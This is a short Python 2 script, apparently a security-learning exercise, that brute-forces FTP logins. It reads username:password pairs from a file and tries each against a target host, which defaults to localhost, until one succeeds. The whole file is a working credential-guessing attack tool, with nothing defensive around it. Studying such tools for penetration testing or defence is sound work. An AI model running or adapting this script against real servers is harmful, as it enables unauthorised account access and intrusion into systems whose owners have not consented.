__author__ = 'derog'

import ftplib

def bruteLogin(hostname, passwdFile):
    pf = open(passwdFile,'r')
    for line in pf.readlines():
        username = line.split(':')[0]
        password = line.split(':')[1].strip('\r').strip('\n')
        print '[*] Trying: '+ username + '/' + password
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(username,password)
            print '[+] Login Succeded: '+ username + '/' +password
            ftp.quit()
            return (username, password)
        except Exception, e:
            pass
    print '\n[-] Brute Force did not break FTP credentials'
    return (None,None)

if __name__=="__main__":
    host = 'localhost'
    passwdFile = 'userpass.txt'
    bruteLogin(host,passwdFile)
